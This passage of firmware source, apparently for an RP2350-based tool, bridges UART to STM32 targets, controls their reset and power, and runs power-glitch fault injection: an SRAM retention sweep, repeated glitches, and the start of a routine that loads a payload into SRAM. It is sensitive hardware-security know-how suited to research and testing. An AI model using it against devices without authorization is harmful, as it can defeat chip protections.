    // Set TX and RX pins for UART1 (GP4/GP5 are default UART1 pins)
    gpio_set_function(tx_pin, GPIO_FUNC_UART);
    gpio_set_function(rx_pin, GPIO_FUNC_UART);

    // Clear RP2350 GPIO isolation bit on TX and RX pins so PIO can also read them
    // gpio_set_function sets ISO, blocking PIO UART trigger from snooping the pin
    hw_clear_bits(&padsbank0_hw->io[tx_pin], PADS_BANK0_GPIO0_ISO_BITS);
    hw_clear_bits(&padsbank0_hw->io[rx_pin], PADS_BANK0_GPIO0_ISO_BITS);

    // Enable UART FIFO
    uart_set_fifo_enabled(TARGET_UART_ID, true);

    // Small delay to allow UART hardware to stabilize after initialization
    sleep_us(100);

    // Enable UART RX interrupt for minimal trigger latency
    irq_set_exclusive_handler(UART1_IRQ, target_uart_irq_handler);
    irq_set_enabled(UART1_IRQ, true);
    uart_set_irq_enables(TARGET_UART_ID, true, false);  // RX interrupt enabled, TX disabled

    target_initialized = true;

    // Clear response buffer
    memset(target_response, 0, TARGET_RESPONSE_SIZE);
    target_response_pos = 0;
    target_response_count = 0;

    uart_cli_printf("OK: Target UART1 initialized on GP%u (TX), GP%u (RX) at %u baud\r\n",
                    tx_pin, rx_pin, baud);
}

void target_uart_send_byte(uint8_t byte) {
    // Auto-initialize UART with defaults if not already initialized
    if (!target_initialized) {
        target_uart_init(TARGET_UART_TX_PIN, TARGET_UART_RX_PIN, target_baud);
    }

    uart_putc_raw(TARGET_UART_ID, byte);
    // Wait for TX FIFO to actually transmit the byte
    uart_tx_wait_blocking(TARGET_UART_ID);

    // Display sent byte in debug mode
    if (debug_mode) {
        uart_cli_printf("[TX] %02X", byte);
        if (byte >= 32 && byte < 127) {
            uart_cli_printf(" '%c'", byte);
        }
        uart_cli_send("\r\n");
    }
}

void target_uart_send_string(const char *str) {
    // Auto-initialize UART with defaults if not already initialized
    if (!target_initialized) {
        target_uart_init(TARGET_UART_TX_PIN, TARGET_UART_RX_PIN, target_baud);
    }

    // Disable UART RX interrupt
    uart_set_irq_enables(TARGET_UART_ID, false, false);

    // Send command to target
    const char *p = str;
    while (*p) {
        uart_putc_raw(TARGET_UART_ID, *p);
        p++;
    }
    // Append \r
    uart_putc_raw(TARGET_UART_ID, '\r');
    uart_tx_wait_blocking(TARGET_UART_ID);

    // Transparent bridge: forward ALL bytes from target to host (raw, no processing)
    // Timeout resets on each received byte
    uint32_t start = to_ms_since_boot(get_absolute_time());

    while (to_ms_since_boot(get_absolute_time()) - start < bridge_timeout_ms) {
        // Read any incoming data from target
        while (uart_is_readable(TARGET_UART_ID)) {
            uint8_t byte = uart_getc(TARGET_UART_ID);

            // Reset timeout on any data received
            start = to_ms_since_boot(get_absolute_time());

            // Display received byte in debug mode
            if (debug_mode) {
                uart_cli_printf("[RX] %02X", byte);
                if (byte >= 32 && byte < 127) {
                    uart_cli_printf(" '%c'", byte);
                }
                uart_cli_send("\r\n");
            }

            // Forward raw byte directly to host (transparent bridge)
            putchar_raw(byte);
        }
    }

    // Re-enable UART RX interrupt for trigger detection
    uart_set_irq_enables(TARGET_UART_ID, true, false);
}

void target_uart_send_hex(const char *hex_str) {
    // Auto-initialize UART with defaults if not already initialized
    if (!target_initialized) {
        target_uart_init(TARGET_UART_TX_PIN, TARGET_UART_RX_PIN, target_baud);
    }

    // Disable UART RX interrupt
    uart_set_irq_enables(TARGET_UART_ID, false, false);

    // Parse hex string and send bytes
    const char *p = hex_str;
    while (*p) {
        // Skip spaces and 0x prefix
        if (*p == ' ' || *p == '\t') {
            p++;
            continue;
        }
        if (*p == '0' && (*(p+1) == 'x' || *(p+1) == 'X')) {
            p += 2;
            continue;
        }

        // Parse hex byte
        if (*p >= '0' && *p <= '9') {
            uint8_t byte = (*p - '0') << 4;
            p++;
            if (*p >= '0' && *p <= '9') {
                byte |= (*p - '0');
            } else if (*p >= 'a' && *p <= 'f') {
                byte |= (*p - 'a' + 10);
            } else if (*p >= 'A' && *p <= 'F') {
                byte |= (*p - 'A' + 10);
            }
            uart_putc_raw(TARGET_UART_ID, byte);
            if (debug_mode) {
                uart_cli_printf("[TX] %02X\r\n", byte);
            }
            p++;
        } else if (*p >= 'a' && *p <= 'f') {
            uint8_t byte = (*p - 'a' + 10) << 4;
            p++;
            if (*p >= '0' && *p <= '9') {
                byte |= (*p - '0');
            } else if (*p >= 'a' && *p <= 'f') {
                byte |= (*p - 'a' + 10);
            } else if (*p >= 'A' && *p <= 'F') {
                byte |= (*p - 'A' + 10);
            }
            uart_putc_raw(TARGET_UART_ID, byte);
            if (debug_mode) {
                uart_cli_printf("[TX] %02X\r\n", byte);
            }
            p++;
        } else if (*p >= 'A' && *p <= 'F') {
            uint8_t byte = (*p - 'A' + 10) << 4;
            p++;
            if (*p >= '0' && *p <= '9') {
                byte |= (*p - '0');
            } else if (*p >= 'a' && *p <= 'f') {
                byte |= (*p - 'a' + 10);
            } else if (*p >= 'A' && *p <= 'F') {
                byte |= (*p - 'A' + 10);
            }
            uart_putc_raw(TARGET_UART_ID, byte);
            if (debug_mode) {
                uart_cli_printf("[TX] %02X\r\n", byte);
            }
            p++;
        } else {
            p++;
        }
    }

    // Wait for TX to complete (no \r append for raw hex - STM32 bootloader needs exact bytes)
    uart_tx_wait_blocking(TARGET_UART_ID);

    // Transparent bridge: forward ALL bytes from target to host (raw, no processing)
    // Timeout resets on each received byte
    uint32_t start = to_ms_since_boot(get_absolute_time());

    while (to_ms_since_boot(get_absolute_time()) - start < bridge_timeout_ms) {
        // Read any incoming data from target
        while (uart_is_readable(TARGET_UART_ID)) {
            uint8_t byte = uart_getc(TARGET_UART_ID);

            // Reset timeout on any data received
            start = to_ms_since_boot(get_absolute_time());

            // Display received byte in debug mode
            if (debug_mode) {
                uart_cli_printf("[RX] %02X", byte);
                if (byte >= 32 && byte < 127) {
                    uart_cli_printf(" '%c'", byte);
                }
                uart_cli_send("\r\n");
            }

            // Forward raw byte directly to host (transparent bridge)
            putchar_raw(byte);
        }
    }

    // Re-enable UART RX interrupt for trigger detection
    uart_set_irq_enables(TARGET_UART_ID, true, false);
}

void target_uart_process(void) {
    // UART RX is now handled by interrupt for minimal trigger latency
    // This function is kept for compatibility but does nothing
    // All RX processing happens in target_uart_irq_handler()
}

uint16_t target_uart_get_response_count(void) {
    return target_response_count;
}

const char* target_uart_get_response(void) {
    target_response[target_response_pos] = '\0';
    return target_response;
}

void target_uart_clear_response(void) {
    memset(target_response, 0, TARGET_RESPONSE_SIZE);
    target_response_pos = 0;
    target_response_count = 0;
}

void target_uart_print_response_hex(void) {
    if (target_response_count == 0) {
        uart_cli_send("No response data\r\n");
        return;
    }

    uart_cli_printf("Response (%u bytes):\r\n", target_response_count);

    // Print each line as received (line-delimited by \n)
    // Output full hex line without breaking into 16-byte chunks
    uint16_t line_start = 0;

    for (uint16_t i = 0; i < target_response_pos; i++) {
        uint8_t byte = (uint8_t)target_response[i];

        // Check for line ending
        if (byte == '\n') {
            // Print all hex bytes for this line
            for (uint16_t j = line_start; j < i; j++) {
                uint8_t line_byte = (uint8_t)target_response[j];
                if (line_byte != '\r') {  // Skip CR
                    uart_cli_printf("%02X ", line_byte);
                }
            }
            uart_cli_send("\r\n");
            line_start = i + 1;
        }
    }

    // Print any remaining bytes after last newline
    if (line_start < target_response_pos) {
        for (uint16_t j = line_start; j < target_response_pos; j++) {
            uint8_t line_byte = (uint8_t)target_response[j];
            if (line_byte != '\r') {  // Skip CR
                uart_cli_printf("%02X ", line_byte);
            }
        }
        uart_cli_send("\r\n");
    }
}

void target_reset_config(uint8_t pin, uint32_t period_ms, bool active_high) {
    // Check if anything has changed
    bool pin_changed = (reset_pin != pin) || !reset_pin_initialized;
    bool polarity_changed = (reset_active_high != active_high);
    bool period_changed = (reset_period_ms != period_ms);
    bool config_changed = pin_changed || polarity_changed || period_changed;

    reset_pin = pin;
    reset_period_ms = period_ms;
    reset_active_high = active_high;

    // Only initialize GPIO if pin or polarity changed
    if (pin_changed || polarity_changed) {
        gpio_init(reset_pin);
        gpio_set_dir(reset_pin, GPIO_OUT);

        // Disable pull resistors to avoid interfering with edge detection
        gpio_disable_pulls(reset_pin);

        gpio_put(reset_pin, reset_active_high ? 0 : 1);  // Inactive state

        // Critical: After Pico reboot, reset pin may have been floating/LOW
        // Give target time to come out of reset before first reset pulse
        sleep_ms(100);

        reset_pin_initialized = true;
    }

    // Only print message if configuration actually changed
    if (config_changed) {
        uart_cli_printf("OK: Reset configured on pin %u, period %u ms, active %s\r\n",
                        pin, period_ms, active_high ? "HIGH" : "LOW");
    }
}

void target_reset_execute(void) {
    // Pulse reset pin
    gpio_put(reset_pin, reset_active_high ? 1 : 0);  // Active state
    sleep_ms(reset_period_ms);
    gpio_put(reset_pin, reset_active_high ? 0 : 1);  // Inactive state

    uart_cli_send("OK: Target reset executed\r\n");
}

bool target_is_initialized(void) {
    return target_initialized;
}

void target_set_debug(bool enable) {
    debug_mode = enable;
}

bool target_get_debug(void) {
    return debug_mode;
}

void target_set_timeout(uint32_t timeout_ms) {
    bridge_timeout_ms = timeout_ms;
}

uint32_t target_get_timeout(void) {
    return bridge_timeout_ms;
}

static void power_ensure_init(void) {
    if (!power_pin_initialized) {
        const uint8_t pins[] = {POWER_PIN1, POWER_PIN2, POWER_PIN3};
        for (int i = 0; i < 3; i++) {
            gpio_init(pins[i]);
            gpio_set_dir(pins[i], GPIO_OUT);
            gpio_set_drive_strength(pins[i], GPIO_DRIVE_STRENGTH_12MA);
        }
        gpio_set_mask(POWER_MASK);  // Default ON
        power_pin_initialized = true;
    }
}

void target_power_on(void) {
    power_ensure_init();
    gpio_set_mask(POWER_MASK);
    uart_cli_send("OK: Target power ON\r\n");
}

void target_power_off(void) {
    power_ensure_init();
    gpio_clr_mask(POWER_MASK);
    uart_cli_send("OK: Target power OFF\r\n");
}

void target_power_cycle(uint32_t time_ms) {
    power_ensure_init();
    gpio_clr_mask(POWER_MASK);
    uart_cli_printf("OK: Target power cycling (OFF for %u ms)...\r\n", time_ms);
    sleep_ms(time_ms);
    gpio_set_mask(POWER_MASK);
    uart_cli_send("OK: Target power ON\r\n");
}

bool target_power_get_state(void) {
    power_ensure_init();
    return gpio_get(POWER_PIN1);
}

// ADC configuration for voltage monitoring
#define ADC_POWER_PIN   26  // GP26 = ADC0, connected to target VDD
#define ADC_POWER_CHAN  0

// SRAM test pattern
#define SRAM_TEST_WORDS 256
#define SRAM_TEST_PATTERN 0xDEAD0000u

// Sweep-derived glitch parameters (set by TARGET GLITCH SWEEP)
// Optimal threshold: highest sweep threshold where BOR triggered AND SRAM survived
static float sweep_optimal_thresh = 0;
static bool sweep_calibrated = false;

static void adc_power_init(void) {
    adc_init();
    adc_gpio_init(ADC_POWER_PIN);
    adc_select_input(ADC_POWER_CHAN);
}

// GPIO interrupt latch for nRST — catches pulses too brief for polling
static volatile bool nrst_irq_fired;
static volatile uint64_t nrst_irq_time;

static void nrst_irq_handler(uint gpio, uint32_t events) {
    (void)gpio;
    (void)events;
    if (!nrst_irq_fired) {
        nrst_irq_fired = true;
        nrst_irq_time = time_us_64();
    }
}

static void nrst_irq_arm(void) {
    nrst_irq_fired = false;
    nrst_irq_time = 0;
    gpio_irq_register(reset_pin, GPIO_IRQ_EDGE_FALL, nrst_irq_handler);
}

static void nrst_irq_disarm(void) {
    gpio_set_irq_enabled(reset_pin, GPIO_IRQ_EDGE_FALL, false);
    gpio_irq_unregister(reset_pin, nrst_irq_handler);
}

// Result of a single power glitch
typedef struct {
    uint32_t glitch_us;
    uint16_t vmin_raw;
    bool thresh_reached;
    bool nrst_went_low;
    uint32_t nrst_low_us;
    uint16_t bor_adc;
} glitch_result_t;

// Execute a single power glitch: drive power low, ADC-gate to threshold,
// restore, monitor nRST.
static void power_glitch_once(uint32_t thresh, uint16_t *adc_log,
                              uint32_t adc_log_size, uint32_t *adc_log_count_out,
                              glitch_result_t *result) {
    result->thresh_reached = true;
    result->nrst_went_low = false;
    result->nrst_low_us = 0;
    result->bor_adc = 0;
    result->vmin_raw = 4095;

    // Arm nRST interrupt to catch brief BOR pulses
    nrst_irq_arm();

    // Float POWER2/3 so only POWER1 sinks (controlled discharge)
    gpio_set_dir(POWER_PIN2, GPIO_IN);
    gpio_set_dir(POWER_PIN3, GPIO_IN);
    gpio_disable_pulls(POWER_PIN2);
    gpio_disable_pulls(POWER_PIN3);

    // Select ADC channel (adc_power_init() already called once by caller)
    adc_select_input(ADC_POWER_CHAN);

    uint32_t adc_log_count = 0;

    // Drive single power pin low
    uint64_t t0 = time_us_64();
    gpio_clr_mask(1u << POWER_PIN1);

    // Poll ADC until voltage drops below threshold
    while (true) {
        uint16_t val = adc_read();
        if (adc_log_count < adc_log_size)
            adc_log[adc_log_count++] = val;
        if (val < result->vmin_raw)
            result->vmin_raw = val;
        if (val <= thresh)
            break;
        if (time_us_64() - t0 > 500000) {
            result->thresh_reached = false;
            break;
        }
    }

    // Restore power: all pins back to output HIGH
    gpio_set_dir(POWER_PIN2, GPIO_OUT);
    gpio_set_dir(POWER_PIN3, GPIO_OUT);
    gpio_set_mask(POWER_MASK);
    result->glitch_us = (uint32_t)(time_us_64() - t0);

    // Monitor nRST for 50ms (polling + IRQ backup)
    for (int i = 0; i < 5000; i++) {
        if (!gpio_get(reset_pin) && !result->nrst_went_low) {
            result->nrst_low_us = (uint32_t)(time_us_64() - t0);
            result->bor_adc = adc_read();
            result->nrst_went_low = true;
        }
        sleep_us(10);
    }

    // Check IRQ latch if polling missed it
    nrst_irq_disarm();
    if (!result->nrst_went_low && nrst_irq_fired) {
        result->nrst_went_low = true;
        result->nrst_low_us = (uint32_t)(nrst_irq_time - t0);
        if (adc_log_count > 0 && result->glitch_us > 0) {
            uint32_t idx = (uint32_t)((uint64_t)result->nrst_low_us * adc_log_count / result->glitch_us);
            if (idx >= adc_log_count) idx = adc_log_count - 1;
            result->bor_adc = adc_log[idx];
        }
    }

    *adc_log_count_out = adc_log_count;
}

static float adc_read_voltage(void) {
    adc_select_input(ADC_POWER_CHAN);
    uint16_t raw = adc_read();
    return raw * 3.3f / 4095.0f;
}

// Auto-detect target via SWD if not already set. Returns target info or NULL.
static const stm32_target_info_t *ensure_target_type(void) {
    extern bool swd_connect(void);
    extern bool swd_detect(uint32_t *cpuid_out, uint32_t *dbg_idcode_out);
    extern void swd_init(void);
    extern void swd_deinit(void);

    const stm32_target_info_t *info = stm32_get_target_info(current_target_type);
    if (info)
        return info;

    // Try SWD IDCODE auto-detection
    uart_cli_send("No target set, attempting SWD auto-detect...\r\n");
    swd_init();
    if (!swd_connect()) {
        swd_deinit();
        uart_cli_send("ERROR: SWD connect failed. Set target with TARGET or SWD IDCODE\r\n");
        return NULL;
    }

    uint32_t cpuid, dbg_id;
    if (!swd_detect(&cpuid, &dbg_id)) {
        swd_deinit();
        uart_cli_send("ERROR: Could not read debug registers. Set target manually\r\n");
        return NULL;
    }
    swd_deinit();

    uint16_t dev_id = dbg_id & 0xFFF;
    target_type_t auto_tt = TARGET_NONE;
    switch (dev_id) {
        case 0x410: case 0x412: case 0x414: case 0x430:
            auto_tt = TARGET_STM32F1; break;
        case 0x438:
            auto_tt = TARGET_STM32F3; break;
        case 0x413: case 0x419: case 0x421: case 0x423: case 0x433:
            auto_tt = TARGET_STM32F4; break;
        case 0x415: case 0x435: case 0x462: case 0x464: case 0x461:
            auto_tt = TARGET_STM32L4; break;
    }
    if (auto_tt == TARGET_NONE) {
        uart_cli_printf("ERROR: Unknown DEV_ID 0x%03X. Set target manually\r\n", dev_id);
        return NULL;
    }

    target_set_type(auto_tt);
    info = stm32_get_target_info(auto_tt);
    uart_cli_printf("Auto-detected: %s (DEV_ID 0x%03X)\r\n", info->name, dev_id);
    return info;
}

static int sram_test_write_pattern(uint32_t sram_base) {
    uint32_t pattern[SRAM_TEST_WORDS];
    for (int i = 0; i < SRAM_TEST_WORDS; i++)
        pattern[i] = SRAM_TEST_PATTERN | (uint32_t)i;

    // Write pattern
    uint32_t written = swd_write_mem(sram_base, pattern, SRAM_TEST_WORDS);
    if (written != SRAM_TEST_WORDS) {
        uart_cli_printf("ERROR: SRAM write failed (%lu/%d words)\r\n", written, SRAM_TEST_WORDS);
        return -1;
    }

    // Verify write
    uint32_t readback[SRAM_TEST_WORDS];
    uint32_t read = swd_read_mem(sram_base, readback, SRAM_TEST_WORDS);
    if (read != SRAM_TEST_WORDS) {
        uart_cli_send("ERROR: SRAM verify read failed\r\n");
        return -1;
    }

    int bad = 0;
    for (int i = 0; i < SRAM_TEST_WORDS; i++) {
        if (readback[i] != pattern[i]) bad++;
    }
    if (bad) {
        uart_cli_printf("ERROR: SRAM verify failed: %d/%d words bad\r\n", bad, SRAM_TEST_WORDS);
        return -1;
    }

    return 0;
}

static int sram_test_read_pattern(uint32_t sram_base) {
    uint32_t readback[SRAM_TEST_WORDS];
    uint32_t read = swd_read_mem(sram_base, readback, SRAM_TEST_WORDS);
    if (read != SRAM_TEST_WORDS)
        return -1;

    int good = 0;
    for (int i = 0; i < SRAM_TEST_WORDS; i++) {
        uint32_t expected = SRAM_TEST_PATTERN | (uint32_t)i;
        if (readback[i] == expected) good++;
    }
    return good;
}

/*
 * SRAM retention sweep — ADC-threshold version (from stimpik).
 *
 * For each step:
 *   1. Write test pattern to SRAM via SWD
 *   2. Float SWD pins, set NRST as input
 *   3. Drop power (clear all power GPIOs)
 *   4. Poll ADC in tight loop until voltage drops to threshold
 *   5. Immediately restore all power GPIOs
 *   6. Monitor NRST for BOR detection
 *   7. Re-attach SWD, read back SRAM, count retained words
 *
 * Sweep threshold from ~2.5V down in ~0.08V steps.
 * High threshold = shallow dip (SRAM survives).
 * Low threshold = deep dip (eventually corrupts SRAM or triggers BOR).
 */
// SRAM retention sweep — based on stimpik by Sean Cross (xobs)
// https://github.com/xobs/stimpik
void target_power_sweep(void) {
    extern bool swd_connect(void);
    extern bool swd_halt(void);
    extern void swd_init(void);
    extern void swd_deinit(void);

    const stm32_target_info_t *info = ensure_target_type();
    if (!info)
        return;

    uint32_t sram_base = info->sram_base;
    uart_cli_printf("SRAM retention sweep on %s (SRAM @ 0x%08lX)\r\n", info->name, sram_base);
    uart_cli_send("Sweep: drop power, poll ADC to threshold, restore, check SRAM\r\n");

    adc_power_init();
    power_ensure_init();

    #define SWEEP_MAX 128
    #define ADC_LOG_SIZE 256

    struct {
        uint32_t thresh;
        uint16_t vmin_raw;
        int16_t good;           // -1 = read failed
        uint32_t glitch_us;
        bool nrst;
        uint16_t bor_adc;
    } results[SWEEP_MAX];
    uint32_t result_count = 0;

    uint16_t adc_log[ADC_LOG_SIZE];

    /* Sweep from ~2.5V down; switch to fine steps after first BOR */
    uint32_t step = 100;  // ~0.08V coarse steps
    bool seen_nrst = false;
    uint32_t nrst_count = 0;
    for (uint32_t thresh = 3103; thresh >= step; thresh -= step) {
        uart_cli_printf("\r\n--- Threshold: %lu (%.2fV) ---\r\n",
                        thresh, thresh * 3.3f / 4095.0f);

        // Connect, halt, write pattern — retry once after power cycle
        swd_init();
        bool setup_ok = false;
        for (int attempt = 0; attempt < 2; attempt++) {
            if (!swd_connect()) {
                if (attempt == 0) {
                    uart_cli_send("SWD connect failed, power cycling...\r\n");
                    swd_deinit();
                    gpio_clr_mask(POWER_MASK);
                    sleep_ms(200);
                    gpio_set_mask(POWER_MASK);
                    sleep_ms(200);
                    swd_init();
                    continue;
                }
                uart_cli_send("ERROR: SWD connect failed after retry\r\n");
                break;
            }
            if (!swd_halt() || sram_test_write_pattern(sram_base) != 0) {
                if (attempt == 0) {
                    uart_cli_send("Write failed, power cycling...\r\n");
                    swd_deinit();
                    gpio_clr_mask(POWER_MASK);
                    sleep_ms(200);
                    gpio_set_mask(POWER_MASK);
                    sleep_ms(200);
                    swd_init();
                    continue;
                }
                uart_cli_send("ERROR: Write failed after retry\r\n");
                break;
            }
            setup_ok = true;
            break;
        }
        if (!setup_ok) {
            swd_deinit();
            break;
        }

        // Float SWD pins before glitch
        swd_deinit();

        // Ensure NRST is input with pull-up
        gpio_init(reset_pin);
        gpio_set_dir(reset_pin, GPIO_IN);
        gpio_pull_up(reset_pin);

        uint32_t adc_log_count = 0;
        glitch_result_t gr;
        power_glitch_once(thresh, adc_log, ADC_LOG_SIZE, &adc_log_count, &gr);

        // Report glitch stats
        if (!gr.thresh_reached) {
            uart_cli_printf("Timeout: Vmin=%.2fV (can't reach %.2fV), NRST: %s\r\n",
                            gr.vmin_raw * 3.3f / 4095.0f,
                            thresh * 3.3f / 4095.0f,
                            gr.nrst_went_low ? "TRIGGERED" : "no reset");
        } else {
            uart_cli_printf("Glitch: %luus, Vmin=%.2fV, NRST: %s",
                            gr.glitch_us,
                            gr.vmin_raw * 3.3f / 4095.0f,
                            gr.nrst_went_low ? "TRIGGERED" : "no reset");
            if (gr.nrst_went_low)
                uart_cli_printf(" (after %luus, BOR@%.2fV)",
                                gr.nrst_low_us, gr.bor_adc * 3.3f / 4095.0f);
            uart_cli_send("\r\n");
        }

        // Wait for target to stabilize
        sleep_ms(50);

        // Re-attach via SWD and read back
        swd_init();
        int good = -1;
        if (swd_connect()) {
            if (swd_halt())
                good = sram_test_read_pattern(sram_base);
        }
        swd_deinit();

        if (good < 0) {
            uart_cli_send("Read failed — power cycling target\r\n");
            // Full power cycle to recover target
            gpio_clr_mask(POWER_MASK);
            sleep_ms(200);
            gpio_set_mask(POWER_MASK);
            sleep_ms(200);
        } else {
            uart_cli_printf("Result: %d/%d words retained at %.2fV threshold\r\n",
                            good, SRAM_TEST_WORDS, thresh * 3.3f / 4095.0f);
        }

        // Record result
        if (result_count < SWEEP_MAX) {
            results[result_count].thresh = thresh;
            results[result_count].vmin_raw = gr.vmin_raw;
            results[result_count].good = (int16_t)good;
            results[result_count].glitch_us = gr.glitch_us;
            results[result_count].nrst = gr.nrst_went_low;
            results[result_count].bor_adc = gr.bor_adc;
            result_count++;
        }

        // After first SRAM corruption, switch to fine steps (~8mV)
        if (good >= 0 && good < SRAM_TEST_WORDS && !seen_nrst) {
            seen_nrst = true;
            step = 10;
            uart_cli_printf("  (Corruption detected, switching to fine steps: ~%.0fmV)\r\n",
                            step * 3300.0f / 4095.0f);
            nrst_count++;
        } else if (good >= 0 && good < SRAM_TEST_WORDS) {
            nrst_count++;
            if (nrst_count >= 8) {
                uart_cli_send("*** 8 corruption events, stopping sweep ***\r\n");
                break;
            }
        }

        // Stop if threshold not reached
        if (!gr.thresh_reached) {
            uart_cli_printf("*** Voltage floor reached at %.2fV, stopping sweep ***\r\n",
                            gr.vmin_raw * 3.3f / 4095.0f);
            break;
        }
        sleep_ms(200);  // Let target fully recover
    }

    // Print summary table
    uart_cli_send("\r\n=== SRAM Retention Sweep Summary ===\r\n");
    uart_cli_send("Thresh(V)  Vmin(V)  Glitch(us)  NRST  BOR(V)  Retained\r\n");
    uart_cli_send("---------  ------   ----------  ----  ------  --------\r\n");
    for (uint32_t i = 0; i < result_count; i++) {
        uart_cli_printf("  %.2fV     %.2fV    %5lu       %s   ",
                        results[i].thresh * 3.3f / 4095.0f,
                        results[i].vmin_raw * 3.3f / 4095.0f,
                        results[i].glitch_us,
                        results[i].nrst ? "Y" : "N");
        if (results[i].nrst)
            uart_cli_printf("%.2fV  ", results[i].bor_adc * 3.3f / 4095.0f);
        else
            uart_cli_send("  --   ");
        if (results[i].good < 0)
            uart_cli_send("FAIL\r\n");
        else
            uart_cli_printf("%d/%d\r\n", results[i].good, SRAM_TEST_WORDS);
    }

    // Report BOR threshold if detected
    float bor_lo = 0, bor_hi = 0;
    for (uint32_t i = 0; i < result_count; i++) {
        if (results[i].nrst) {
            bor_lo = results[i].bor_adc * 3.3f / 4095.0f;
            if (i > 0)
                bor_hi = results[i - 1].vmin_raw * 3.3f / 4095.0f;
            break;
        }
    }
    if (bor_lo > 0) {
        uart_cli_printf("\r\nBOR threshold: ~%.2fV", bor_lo);
        if (bor_hi > 0)
            uart_cli_printf(" (last no-reset Vmin: %.2fV)", bor_hi);
        uart_cli_send("\r\n");
    } else {
        uart_cli_send("\r\nBOR not triggered during sweep\r\n");
    }

    // Derive optimal glitch threshold from sweep results
    // Find the lowest sweep threshold where BOR triggered AND SRAM fully survived
    // This is the sweet spot: deep enough for BOR, shallow enough for SRAM
    {
        float best = 0;
        for (uint32_t i = 0; i < result_count; i++) {
            if (results[i].nrst && results[i].good == SRAM_TEST_WORDS) {
                float v = results[i].thresh * 3.3f / 4095.0f;
                if (best == 0 || v < best) best = v;
            }
        }
        if (best > 0) {
            sweep_optimal_thresh = best;
            sweep_calibrated = true;
            uart_cli_printf("\r\nCalibration saved: optimal threshold=%.2fV\r\n",
                            sweep_optimal_thresh);
        }
    }

    // Ensure power is restored and reset pin back to normal
    gpio_set_mask(POWER_MASK);
    gpio_init(reset_pin);
    gpio_set_dir(reset_pin, GPIO_OUT);
    gpio_disable_pulls(reset_pin);
    gpio_put(reset_pin, reset_active_high ? 0 : 1);

    uart_cli_send("Sweep complete, power restored\r\n");
}

// Repeated power glitch at a fixed threshold — reports success rate
void target_power_glitch(float voltage, uint32_t count) {
    extern bool swd_connect(void);
    extern bool swd_halt(void);
    extern void swd_init(void);
    extern void swd_deinit(void);

    const stm32_target_info_t *info = ensure_target_type();
    if (!info)
        return;

    uint32_t sram_base = info->sram_base;
    uint32_t thresh = (uint32_t)(voltage * 4095.0f / 3.3f);
    if (thresh > 4095) thresh = 4095;

    uart_cli_printf("Power glitch: %.2fV threshold (ADC %lu), %lu iterations on %s\r\n",
                    voltage, thresh, count, info->name);

    adc_power_init();
    power_ensure_init();

    uint32_t total_retained = 0;
    uint32_t total_nrst = 0;
    uint32_t total_both = 0;  // retained AND nRST
    uint32_t total_fail = 0;
    uint32_t total_timeout = 0;
    uint32_t glitch_us_sum = 0;

    #define GLITCH_ADC_LOG 256
    uint16_t adc_log[GLITCH_ADC_LOG];

    for (uint32_t iter = 0; iter < count; iter++) {
        // Connect, halt, write pattern
        swd_init();
        if (!swd_connect()) {
            uart_cli_printf("[%lu/%lu] SWD connect failed\r\n", iter + 1, count);
            swd_deinit();
            total_fail++;
            sleep_ms(200);
            continue;
        }
        swd_halt();
        if (sram_test_write_pattern(sram_base) != 0) {
            uart_cli_printf("[%lu/%lu] SRAM write failed\r\n", iter + 1, count);
            swd_deinit();
            total_fail++;
            sleep_ms(200);
            continue;
        }

        // Float SWD pins before glitch
        swd_deinit();

        // nRST as input with pull-up
        gpio_init(reset_pin);
        gpio_set_dir(reset_pin, GPIO_IN);
        gpio_pull_up(reset_pin);

        uint32_t adc_log_count = 0;
        glitch_result_t gr;
        power_glitch_once(thresh, adc_log, GLITCH_ADC_LOG, &adc_log_count, &gr);

        if (!gr.thresh_reached) {
            total_timeout++;
            uart_cli_printf("[%lu/%lu] Timeout\r\n", iter + 1, count);
            sleep_ms(200);
            continue;
        }

        glitch_us_sum += gr.glitch_us;

        // Wait for target to stabilize, then read back SRAM
        sleep_ms(50);
        swd_init();
        int good = -1;
        if (swd_connect()) {
            swd_halt();
            good = sram_test_read_pattern(sram_base);
        }
        swd_deinit();

        bool retained = (good == SRAM_TEST_WORDS);
        if (retained) total_retained++;
        if (gr.nrst_went_low) total_nrst++;
        if (retained && gr.nrst_went_low) total_both++;
        if (good < 0) total_fail++;

        uart_cli_printf("[%lu/%lu] %luus Vmin=%.2fV NRST:%s SRAM:%s\r\n",
                        iter + 1, count, gr.glitch_us,
                        gr.vmin_raw * 3.3f / 4095.0f,
                        gr.nrst_went_low ? "Y" : "N",
                        good < 0 ? "FAIL" : (retained ? "OK" : "CORRUPT"));

        sleep_ms(200);
    }

    // Summary
    uint32_t valid = count - total_timeout - total_fail;
    uart_cli_send("\r\n=== Power Glitch Summary ===\r\n");
    uart_cli_printf("Threshold: %.2fV, Iterations: %lu\r\n", voltage, count);
    if (valid > 0)
        uart_cli_printf("Avg glitch: %luus\r\n", glitch_us_sum / valid);
    uart_cli_printf("SRAM retained: %lu/%lu (%lu%%)\r\n",
                    total_retained, count,
                    count > 0 ? total_retained * 100 / count : 0);
    uart_cli_printf("nRST fired:    %lu/%lu (%lu%%)\r\n",
                    total_nrst, count,
                    count > 0 ? total_nrst * 100 / count : 0);
    uart_cli_printf("Both (window): %lu/%lu (%lu%%)\r\n",
                    total_both, count,
                    count > 0 ? total_both * 100 / count : 0);
    if (total_fail > 0)
        uart_cli_printf("SWD failures:  %lu\r\n", total_fail);
    if (total_timeout > 0)
        uart_cli_printf("Timeouts:      %lu\r\n", total_timeout);

    // Restore
    gpio_set_mask(POWER_MASK);
    gpio_init(reset_pin);
    gpio_set_dir(reset_pin, GPIO_OUT);
    gpio_disable_pulls(reset_pin);
    gpio_put(reset_pin, reset_active_high ? 0 : 1);

    uart_cli_send("Glitch test complete, power restored\r\n");
}

// Upload payload to SRAM, set BOOT0/BOOT1 for SRAM boot, power glitch to reset
void target_power_payload(float voltage, uint32_t max_attempts) {
    extern bool swd_connect(void);
    extern bool swd_halt(void);
    extern void swd_init(void);
    extern void swd_deinit(void);
    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);

    const stm32_target_info_t *info = ensure_target_type();
    if (!info)
        return;

    uint32_t sram_base = info->sram_base;

    // Payload size in 32-bit words (round up)
    uint32_t payload_words = (sizeof(f103_led_payload) + 3) / 4;

    uart_cli_printf("SRAM payload: %u bytes (%lu words) -> 0x%08lX\r\n",
                    (unsigned)sizeof(f103_led_payload), payload_words, sram_base);

    // Step 1: Upload payload to SRAM via SWD
    uart_cli_send("[1] Uploading payload to SRAM...\r\n");
    swd_init();
    if (!swd_connect()) {
        swd_deinit();
